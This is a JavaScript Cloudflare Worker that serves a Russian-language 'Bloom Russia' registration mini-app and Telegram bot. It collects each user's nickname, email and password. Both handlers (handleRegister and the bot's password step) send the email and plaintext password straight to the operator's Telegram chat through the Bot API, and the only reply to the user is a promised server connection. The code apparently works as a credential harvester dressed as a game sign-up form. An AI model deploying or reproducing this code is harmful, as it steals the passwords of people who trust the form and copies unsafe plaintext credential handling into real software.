async function sendTelegram(token, chatId, text) {
  await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' }),
  }).catch(() => {});
}

function json(obj, status) {
  status = status || 200;
  return new Response(JSON.stringify(obj), { status: status, headers: { 'Content-Type': 'application/json' } });
}

async function handleRegister(request, env) {
  if (request.method !== 'POST') return json({ error: 'Метод не поддерживается' }, 405);
  let body;
  try { body = await request.json(); } catch { return json({ error: 'Неверный JSON' }, 400); }
  const nick = String(body.nick || '').trim();
  const mail = String(body.mail || '').trim();
  const pass = String(body.pass || '');
  if (!/^[A-Za-z0-9_]{3,24}$/.test(nick)) return json({ error: 'Ник: 3-24 символа, буквы, цифры, _' }, 400);
  if (!/^\S+@\S+\.\S+$/.test(mail) || mail.length > 61) return json({ error: 'Неверная почта' }, 400);
  if (pass.length < 6 || pass.length > 32) return json({ error: 'Пароль: 6-32 символа' }, 400);
  const token = env.TG_BOT_TOKEN;
  const chatId = env.TG_CHAT_ID;
  if (!token || !chatId) return json({ error: 'Токен бота не настроен' }, 500);
  const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
  await sendTelegram(token, chatId, '📋 <b>Новая заявка (сайт)</b>\nНик: ' + nick + '\nПочта: ' + mail + '\nПароль: ' + pass + '\nВремя: ' + time);
  return json({ ok: true });
}

async function handleTelegram(request, env) {
  const secret = env.TG_WEBHOOK_SECRET;
  if (secret && request.headers.get('x-telegram-bot-api-secret-token') !== secret) {
    return new Response('unauthorized', { status: 401 });
  }
  const update = await request.json().catch(() => ({}));
  const msg = update.message;
  if (!msg || !msg.text) return new Response('ok');
  const chatId = String(msg.chat.id);
  const text = msg.text.trim();
  const token = env.TG_BOT_TOKEN;
  const kv = env.TG_STATE;
  const key = 'state:' + chatId;
  const send = function(t) { return sendTelegram(token, chatId, t); };
  if (text === '/start' || text === '/register' || text === '📝 Регистрация') {
    await kv.put(key, JSON.stringify({ step: 'nick' }), { expirationTtl: 3600 });
    await send('✏️ Введите никнейм (3-24 символа, буквы, цифры, _):');
    return new Response('ok');
  }
  if (text === '/cancel') {
    await kv.delete(key);
    await send('Регистрация отменена. Напишите /start чтобы начать заново.');
    return new Response('ok');
  }
  const raw = await kv.get(key);
  const state = raw ? JSON.parse(raw) : null;
  if (!state) {
    await send('Сессия истекла. Напишите /start чтобы начать заново.');
    return new Response('ok');
  }
  if (state.step === 'nick') {
    if (!/^[A-Za-z0-9_]{3,24}$/.test(text)) { await send('Неверный формат ника. Повторите ввод:'); return new Response('ok'); }
    state.nick = text; state.step = 'email';
    await kv.put(key, JSON.stringify(state), { expirationTtl: 3600 });
    await send('✅ Принято! Введите вашу почту:');
    return new Response('ok');
  }
  if (state.step === 'email') {
    if (!/^\S+@\S+\.\S+$/.test(text) || text.length > 61) { await send('Неверная почта. Введите повторно:'); return new Response('ok'); }
    state.email = text; state.step = 'pass';
    await kv.put(key, JSON.stringify(state), { expirationTtl: 3600 });
    await send('🔐 Введите пароль (6-32 символа):');
    return new Response('ok');
  }
  if (state.step === 'pass') {
    if (text.length < 6 || text.length > 32) { await send('Пароль должен быть от 6 до 32 символов. Повторите:'); return new Response('ok'); }
    await kv.delete(key);
    await send('✅ Заявка принята! Ник: <b>' + state.nick + '</b>\nОжидайте соединения с сервером Сочи: 5 ноября, 17:00 (МСК).');
    const ownerTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
    await sendTelegram(token, env.TG_CHAT_ID, '📋 <b>Новая заявка (бот)</b>\nНик: ' + state.nick + '\nПочта: ' + state.email + '\nПароль: ' + text + '\nВремя: ' + ownerTime);
    return new Response('ok');
  }
  return new Response('ok');
}

async function handleMiniApp() {
  const html = [
    '<!DOCTYPE html>',
    '<html lang="ru">',
    '<head>',
    '<meta charset="UTF-8">',
    '<meta name="viewport" content="width=device-width, initial-scale=1.0">',
    '<title>Bloom Russia · Регистрация</title>',
    '<script src="https://telegram.org/js/telegram-web-app.js"></script>',
    '<style>',
    '* { box-sizing: border-box; }',
    'body { margin: 0; padding: 20px; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }',
    '.card { width: 100%; max-width: 420px; background: linear-gradient(180deg, #16161e, #0f0f15); border: 1px solid #2a2a3a; border-radius: 20px; padding: 28px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }',
    'h2 { margin: 0 0 8px; font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }',
    '.subtitle { color: #888; font-size: 14px; margin-bottom: 24px; }',
    '.input-group { margin-bottom: 16px; }',
    'label { display: block; font-size: 13px; color: #aaa; margin-bottom: 7px; font-weight: 500; }',
    'input { width: 100%; padding: 13px 14px; border: 1px solid #333; border-radius: 12px; background: #0a0a0a; color: #fff; font-size: 16px; outline: none; }',
    'input:focus { border-color: #7c3aed; }',
    'button { width: 100%; margin-top: 8px; padding: 15px; border: none; border-radius: 12px; background: linear-gradient(90deg, #7c3aed, #4f46e5); color: #fff; font-size: 17px; font-weight: 600; cursor: pointer; }',
    'button:disabled { opacity: 0.6; cursor: not-allowed; }',
    '#status { margin-top: 16px; font-size: 14px; min-height: 20px; text-align: center; }',
    '.success { color: #4ade80; }',
    '.error { color: #f87171; }',
    '</style>',
    '</head>',
    '<body>',
    '<div class="card">',
    '<h2>🎮 Bloom Russia</h2>',
    '<p class="subtitle">Регистрация через Telegram Mini App</p>',
    '<div class="input-group"><label>Никнейм (3–24 символа)</label><input type="text" id="nick" maxlength="24" placeholder="Sasha_Yokato"></div>',
    '<div class="input-group"><label>Почта</label><input type="email" id="mail" placeholder="you@mail.ru"></div>',
    '<div class="input-group"><label>Пароль (6–32 символа)</label><input type="password" id="pass" maxlength="32"></div>',
    '<button id="submitBtn">Отправить заявку</button>',
    '<div id="status"></div>',
    '</div>',
    '<script>',
    'const tg = window.Telegram.WebApp;',
    'tg.expand(); tg.ready(); tg.setHeaderColor("#0a0a0a"); tg.setBackgroundColor("#0a0a0a");',
    'const nickInput = document.getElementById("nick");',
    'const mailInput = document.getElementById("mail");',
    'const passInput = document.getElementById("pass");',
    'const submitBtn = document.getElementById("submitBtn");',
    'const statusDiv = document.getElementById("status");',
    'function showStatus(text, type) { statusDiv.textContent = text; statusDiv.className = type; }',
    'submitBtn.addEventListener("click", async () => {',
    '  const nick = nickInput.value.trim();',
    '  const mail = mailInput.value.trim();',
    '  const pass = passInput.value;',
    '  if (!/^[A-Za-z0-9_]{3,24}$/.test(nick)) { showStatus("Неверный никнейм", "error"); return; }',
    '  if (!/^\\S+@\\S+\\.\\S+$/.test(mail) || mail.length > 61) { showStatus("Неверная почта", "error"); return; }',
    '  if (pass.length < 6 || pass.length > 32) { showStatus("Неверный пароль", "error"); return; }',
    '  submitBtn.disabled = true; submitBtn.textContent = "Отправка...";',
    '  try {',
    '    const response = await fetch("/api/register", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ nick: nick, mail: mail, pass: pass }) });',
    '    const data = await response.json();',
    '    if (data.ok) { showStatus("Заявка отправлена администратору ✅", "success"); tg.MainButton.setText("Готово"); tg.MainButton.show(); }',
    '    else { showStatus(data.error || "Ошибка сервера", "error"); submitBtn.disabled = false; submitBtn.textContent = "Отправить заявку"; }',
    '  } catch (e) { showStatus("Ошибка сети", "error"); submitBtn.disabled = false; submitBtn.textContent = "Отправить заявку"; }',
    '});',
    'tg.MainButton.onClick(() => tg.close());',
    '</script>',
    '</body>',
    '</html>'
  ].join('\n');
  return new Response(html, { status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8' } });
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    if (url.pathname === '/api/register') return handleRegister(request, env);
    if (url.pathname === '/api/telegram') return handleTelegram(request, env);
    if (url.pathname === '/miniapp') return handleMiniApp(request);
    return env.ASSETS.fetch(request);
  },
};